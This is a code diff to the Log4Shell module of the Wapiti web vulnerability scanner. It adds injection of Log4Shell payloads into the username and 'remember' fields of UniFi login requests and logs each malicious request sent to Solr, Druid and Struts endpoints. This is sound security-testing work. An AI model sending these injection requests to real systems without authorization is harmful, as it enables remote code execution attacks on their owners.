@@ -9,7 +9,7 @@ import dns.resolver
 from httpx import RequestError
 from wapitiCore.attack.attack import Attack
 from wapitiCore.definitions.log4shell import NAME, WSTG_CODE
-from wapitiCore.main.log import log_red, logging
+from wapitiCore.main.log import log_red, logging, log_verbose
 from wapitiCore.net.response import Response
 from wapitiCore.net import Request
 
@@ -28,6 +28,7 @@ class ModuleLog4Shell(Attack):
     VSPHERE_URL = "websso/SAML2/SSO"
     DRUID_URL = "druid/coordinator/v1/lookups/config/"
     SOLR_URL = "solr/admin/cores"
+    UNIFI_URL = "api/login"
 
     def __init__(self, crawler, persister, attack_options, stop_event, crawler_configuration):
         Attack.__init__(self, crawler, persister, attack_options, stop_event, crawler_configuration)
@@ -58,24 +59,55 @@ class ModuleLog4Shell(Attack):
         malicious_headers = {header_target: payload}
 
         try:
+            log_verbose(f"[¨] {malicious_request}")
             response = await self.crawler.async_send(malicious_request, malicious_headers, follow_redirects=True)
         except RequestError:
             self.network_errors += 1
             return
         await self._verify_header_vulnerability(malicious_request, header_target, payload, payload_unique_id, response)
 
+    async def _attack_unifi_url(self, request_url: Request):
+
+        payload_unique_id = uuid.uuid4()
+        payload = self._generate_payload(payload_unique_id)
+
+        malicious_request_username = Request(
+            path=request_url,
+            method="POST",
+            enctype="application/json",
+            post_params=f'{{"username": "{payload}", "password": "Letm3in_", "remember": false, "strict": true}}'
+        )
+
+        malicious_request_remember = Request(
+            path=request_url,
+            method="POST",
+            enctype="application/json",
+            post_params=f'{{"username": "alice", "password": "Letm3in_", "remember": "{payload}", "strict": true}}'
+        )
+
+        try:
+            log_verbose(f"[¨] {malicious_request_username}")
+            response = await self.crawler.async_send(malicious_request_username, follow_redirects=True)
+            await self._verify_param_vulnerability(malicious_request_username, payload_unique_id, "username", response)
+        except RequestError:
+            self.network_errors += 1
+
+        try:
+            log_verbose(f"[¨] {malicious_request_remember}")
+            response = await self.crawler.async_send(malicious_request_remember, follow_redirects=True)
+            await self._verify_param_vulnerability(malicious_request_remember, payload_unique_id, "remember", response)
+        except RequestError:
+            self.network_errors += 1
+
     async def attack_apache_solr_url(self, request_url: str):
         payload_unique_id = uuid.uuid4()
         payload = self._generate_payload(payload_unique_id).replace("{", "%7B").replace("}", "%7D")
         query = f"action=CREATE&name={payload}&wt=json"
 
-        malicious_request = Request(
-            path=request_url + "?" + query,
-            method="GET",
-            get_params=None,
-        )
+        malicious_request = Request(path=request_url + "?" + query, method="GET", get_params=None)
 
         try:
+            log_verbose(f"[¨] {malicious_request}")
             response = await self.crawler.async_send(malicious_request, follow_redirects=True)
         except RequestError:
             self.network_errors += 1
@@ -92,6 +124,7 @@ class ModuleLog4Shell(Attack):
         modified_request = Request(request_url + ("" if request_url.endswith("/") else "/") + payload + "/")
 
         try:
+            log_verbose(f"[¨] {modified_request}")
             page = await self.crawler.async_send(modified_request, follow_redirects=True)
         except RequestError:
             self.network_errors += 1
@@ -102,12 +135,10 @@ class ModuleLog4Shell(Attack):
         payload_unique_id = uuid.uuid4()
         payload = self._generate_payload(payload_unique_id).replace("{", "%7B").replace("}", "%7D").replace("/", "%2f")
 
-        malicious_request = Request(
-            path=request_url + payload,
-            method="DELETE",
-        )
+        malicious_request = Request(path=request_url + payload, method="DELETE")
 
         try:
+            log_verbose(f"[¨] {malicious_request}")
             page = await self.crawler.async_send(malicious_request, follow_redirects=True)
         except RequestError:
             self.network_errors += 1
@@ -130,6 +161,7 @@ class ModuleLog4Shell(Attack):
             await self._attack_apache_struts(request.url)
             await self._attack_apache_druid_url(current_url + self.DRUID_URL)
             await self.attack_apache_solr_url(current_url + self.SOLR_URL)
+            await self._attack_unifi_url(current_url + self.UNIFI_URL)
         await self._attack_vsphere_url(request)
 
     async def attack(self, request: Request, response: Optional[Response] = None):
@@ -142,6 +174,7 @@ class ModuleLog4Shell(Attack):
             modified_request = Request(request.url)
 
             try:
+                log_verbose(f"[¨] {modified_request}")
                 page = await self.crawler.async_send(modified_request, malicious_headers, follow_redirects=True)
             except RequestError:
                 self.network_errors += 1
@@ -155,6 +188,7 @@ class ModuleLog4Shell(Attack):
 
         for malicious_request, param_name, param_uuid in injected_get_and_post_requests:
             try:
+                log_verbose(f"[¨] {malicious_request}")
                 page = await self.crawler.async_send(malicious_request, follow_redirects=True)
             except RequestError:
                 self.network_errors += 1
@@ -183,7 +217,8 @@ class ModuleLog4Shell(Attack):
         )
 
         log_red("---")
-        log_red(f"URL {request.url} seems vulnerable to Log4Shell attack by using the {element_type} {param_name}")
+        log_red(
+            f"URL {request.url} seems vulnerable to Log4Shell attack by using the {element_type} {param_name}")
         log_red(request.http_repr())
         log_red("---")
 
@@ -256,7 +291,8 @@ class ModuleLog4Shell(Attack):
         batch_size = 10
 
         # Creates batch of batch_size elements
-        headers_batch = [headers[i:i + batch_size] for i in range(0, len(headers), batch_size)]
+        headers_batch = [headers[i:i + batch_size]
+                         for i in range(0, len(headers), batch_size)]
 
         # Creates a UUID for each header
         for header_batch in headers_batch:
